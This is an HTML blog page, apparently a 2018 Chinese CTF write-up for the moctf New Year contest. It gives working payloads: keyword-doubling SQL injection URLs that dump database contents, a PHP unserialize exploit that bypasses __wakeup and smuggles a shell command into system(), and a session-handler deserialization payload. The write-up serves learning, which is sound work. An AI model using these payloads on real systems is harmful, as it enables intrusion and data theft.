@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="moctf-新春欢乐赛"/>
+  <meta name="twitter:description" content="划水。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>moctf-新春欢乐赛 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        moctf-新春欢乐赛
+                    </h1>
+                    <h2 class="headline">
+                    Feb 13, 2018 09:54
+                    · 309 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#是时候让你手指锻炼一下了">是时候让你手指锻炼一下了</a></li>
+<li><a href="#ez-injection">ez Injection</a></li>
+<li><a href="#pubg">PUBG</a>
+<ul>
+<li><a href="#大致思路">大致思路</a></li>
+<li><a href="#操作">操作</a></li>
+</ul></li>
+<li><a href="#登录一哈">登录一哈</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>划水。
+<!-- more --></p>
+
+<h2 id="是时候让你手指锻炼一下了">是时候让你手指锻炼一下了</h2>
+
+<p>查看源码发现是js验证clicks。
+payload</p>
+
+<pre><code>	
+http://120.78.57.208:6003/web1/?clicks=111111111111111111111111111
+
+</code></pre>
+
+<h2 id="ez-injection">ez Injection</h2>
+
+<p>注入题，测试后发现过滤了空格，括号和几个关键字。payload如下</p>
+
+<pre><code>#爆库
+http://120.78.57.208:6002/index.php?id=-3%27/**/ununionion/**/seselectlect/**/SCHEMA_NAME,3,4/**/frfromom/**/information_schema.schemata/**/limit/**/0,1%23
+#爆表
+http://120.78.57.208:6002/index.php?id=-3%27/**/ununionion/**/seselectlect/**/table_NAME,3,4/**/frfromom/**/information_schema.tables/**/whewherere/**/table_schema=%27sheldon%27/**/limit/**/0,1%23
+#爆列
+http://120.78.57.208:6002/index.php?id=-3%27/**/ununionion/**/seselectlect/**/COLUMN_NAME,3,4/**/frfromom/**/information_schema.columns/**/whewherere/**/table_name=%2704ad5938eaf0efb6%27/**/limit/**/0,1%23
+#爆flag
+http://120.78.57.208:6002/index.php?id=-3%27/**/ununionion/**/seselectlect/**/value,3,4/**/frfromom/**/04ad5938eaf0efb6/**/limit/**/0,1%23
+</code></pre>
+
+<h2 id="pubg">PUBG</h2>
+
+<p>1.发现index.php.bak文件泄露
+关键代码</p>
+
+<pre><code>&lt;?php
+    error_reporting(0);
+    include 'class.php';
+    if(is_array($_GET)&amp;&amp;count($_GET)&gt;0)
+    {
+        if(isset($_GET[&quot;LandIn&quot;]))
+        {
+            $pos=$_GET[&quot;LandIn&quot;];
+        }
+        if($pos===&quot;airport&quot;)
+        {
+            die(&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;);
+        }
+        elseif($pos===&quot;school&quot;)
+        {
+            echo('&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot;  style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;');
+            $pubg=$_GET['pubg'];
+            $p = unserialize($pubg);
+            // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);
+        }
+        elseif($pos===&quot;AFK&quot;)
+        {
+            die(&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;);
+        }
+        else
+        {
+            die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;);
+            
+        }
+    }
+?&gt;
+</code></pre>
+
+<p>新发现class.php，尝试也有.bak文件泄露</p>
+
+<pre><code>&lt;?php
+    include 'waf.php';
+    class sheldon{
+        public $bag=&quot;nothing&quot;;
+        public $weapon=&quot;M24&quot;;
+        // public function __toString(){
+        //     $this-&gt;str=&quot;You got the airdrop&quot;;
+        //     return $this-&gt;str;
+        // }
+        public function __wakeup()
+        {
+            $this-&gt;bag=&quot;nothing&quot;;
+            $this-&gt;weapon=&quot;kar98K&quot;;
+        }
+        public function Get_air_drops($b)
+        {
+                $this-&gt;$b();
+        }
+        public function __call($method,$parameters)
+        {
+            $file = explode(&quot;.&quot;,$method);
+            echo $file[0];
+            if(file_exists(&quot;.//class$file[0].php&quot;))
+            {
+                system(&quot;php  .//class//$method.php&quot;);
+            }
+            else
+            {
+                system(&quot;php  .//class//win.php&quot;);
+            }
+            die();
+        }
+        public function nothing()
+        {
+            die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;);
+        }
+        public function __destruct()
+        {
+            waf($this-&gt;bag);
+            if($this-&gt;weapon==='AWM')
+            {
+                $this-&gt;Get_air_drops($this-&gt;bag);
+            }
+            else
+            {
+                die('&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;');
+            }
+        }
+    }
+?&gt;
+
+</code></pre>
+
+<ul>
+<li><strong>call 当要调用的方法不存在或权限不足时，会自动调用</strong>call 方法。</li>
+<li>__destruct()：析构函数，当对象被销毁时会自动调用。</li>
+
+<li><p>__wakeup() ：如前所提，unserialize()时会自动调用。</p>
+
+<h3 id="大致思路">大致思路</h3>
+
+<p>1.在执行反序列化操作后会直接触发<strong>wakeup和</strong>destruct，可以看到<strong>destruct中对weapon有限制，所以需要绕过</strong>wakeup函数。
+2.通过\$this-&gt;Get_air_drops(\$this-&gt;bag);这行代码去触发<strong>call函数。将$this-&gt;bag作为</strong>call函数的\$method参数。
+3.通过构造\$method参数执行恶意代码</p>
+
+<h3 id="操作">操作</h3>
+
+<p>1.绕过<strong>wakeup函数
+方法是如果表示对象属性个数的值大于真实的属性个数时就会跳过</strong>wakeup的执行。
+例：</p>
+
+<pre><code>#原始的序列化字符
+O:7:&quot;sheldon&quot;:2:{s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;s:3:&quot;bag&quot;;s:8:&quot;flag.php&quot;;}
+
+#修改后即可绕过
+O:7:&quot;sheldon&quot;:3:{s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;s:3:&quot;bag&quot;;s:8:&quot;flag.php&quot;;}
+</code></pre></li>
+</ul>
+
+<p>2.执行恶意代码
+在这里我是想通过运行flag.php去获取flag，但是测试后一直没有反应，于是就卡在这了。
+赛后看了writeup才知道这是一个命令执行去打印出flag.php才能拿到flag的。因为flag.php没有echo flag，而是把flag被注释了。。所以在怎么执行flag.php，也不会有反应。(真的是菜，看到system函数竟然不去构造命令执行。。。)</p>
+
+<p>这是我之前构造的运行flag.php的字符串</p>
+
+<pre><code>&lt;?php
+class sheldon{
+public $weapon;    
+public $bag;    
+}    
+$a = new sheldon();  
+$a-&gt;bag = &quot;flag.php win&quot;; 
+$a-&gt;weapon = &quot;AWM&quot;;
+$a = serialize($a);  
+echo $a; 
+//O:7:&quot;sheldon&quot;:2:{s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;s:3:&quot;bag&quot;;s:12:&quot;flag.php win&quot;;}
+</code></pre>
+
+<pre><code>#在linux下，此命令运行的结果是运行flag.php。不运行win.php。
+php flag.php win.php
+</code></pre>
+
+<p>正解</p>
+
+<pre><code>class sheldon{
+public $weapon;    
+public $bag;    
+}    
+$a = new sheldon();  
+$a-&gt;bag = &quot;flag.php &amp;&amp; l\s &amp;&amp; win&quot;; 
+$a-&gt;weapon = &quot;AWM&quot;;
+$a = serialize($a);  
+echo $a; 
+</code></pre>
+
+<p>输出的序列化字符</p>
+
+<pre><code>O:7:&quot;sheldon&quot;:2:{s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;s:3:&quot;bag&quot;;s:22:&quot;flag.php &amp;&amp; l\s &amp;&amp; win&quot;;}
+#修改后
+O:7:&quot;sheldon&quot;:3:{s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;s:3:&quot;bag&quot;;s:22:&quot;flag.php &amp;&amp; l\s &amp;&amp; win&quot;;}
+</code></pre>
+
+<p>这里还需要url编码一下，不然会失败.</p>
+
+<pre><code>O%3a7%3a%22sheldon%22%3a3%3a%7bs%3a6%3a%22weapon%22%3bs%3a3%3a%22AWM%22%3bs%3a3%3a%22bag%22%3bs%3a22%3a%22flag.php+%26%26+l%5cs+%26%26+win%22%3b%7d
+</code></pre>
+
+<p>最终读取flag.php的payload</p>
+
+<pre><code>http://120.78.57.208:6001/?LandIn=school&amp;pubg=O%3a7%3a%22sheldon%22%3a3%3a%7bs%3a6%3a%22weapon%22%3bs%3a3%3a%22AWM%22%3bs%3a3%3a%22bag%22%3bs%3a40%3a%22flag.php+%26%26+c%5cat+.%2fclass%2fflag.php+%26%26+win%22%3b%7d
+</code></pre>
+
+<h2 id="登录一哈">登录一哈</h2>
+
+<p>git源码泄露，拿到源码
+index.php关键代码</p>
+
+<pre><code>    &lt;?php
+        ini_set('session.serialize_handler', 'php_binary');
+        session_start();
+
+        if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){
+            $username = $_POST['username'];
+            $password = $_POST['password'];
+            $_SESSION[&quot;username&quot;] = $username;
+            header(&quot;Location:./index.php&quot;);
+        }
+        else if(isset($_SESSION[&quot;username&quot;])){
+            echo '&lt;h1&gt;hello '.$_SESSION[&quot;username&quot;].'&lt;/h1&gt;';
+        }
+        else {
+    ?&gt;
+</code></pre>
+
+<p>flag.php</p>
+
+<pre><code>&lt;?php
+|O:5:&quot;MOCTF&quot;:2:{s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;i:0;}
+session_start();
+class MOCTF{
+    public $flag;
+    public $name;
+    function __destruct(){
+        $this-&gt;flag = &quot;moctf{xxxxxxxxxxxxxxxxxxx}&quot;;
+        if($this-&gt;flag == $this-&gt;name){
+            echo &quot;Wow,this is flag:&quot;.$this-&gt;flag;
+        }
+    }
+}
+
+
+</code></pre>
+
+<p>看了flag.php感觉是反序列化。
+再看index.php发现</p>
+
+<pre><code>ini_set('session.serialize_handler', 'php_binary');
+</code></pre>
+
+<p>查了一下，这行代码是设置php的session存储方式的。
+百度之后发现当两个页面设置的session的存储方式不同时会造成反序列化漏洞。
+即可以看到在index.php会对$_SESSION[&ldquo;username&rdquo;] = $username;,所以要构造的参数就是username
+payload</p>
+
+<pre><code>username：
+|O:5:&quot;MOCTF&quot;:2:{s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;i:0;}
+password：
+随便
+</code></pre>
+
+<p>提交之后，访问flag.php即拿到flag。</p>
+
+<p>菜鸡只会做这几个，先记下这几个做的，其他的以后在平台在补吧。。。</p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2fmoctf-%25E6%2596%25B0%25E6%2598%25A5%25E6%25AC%25A2%25E4%25B9%2590%25E8%25B5%259B%2f - moctf-%e6%96%b0%e6%98%a5%e6%ac%a2%e4%b9%90%e8%b5%9b "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
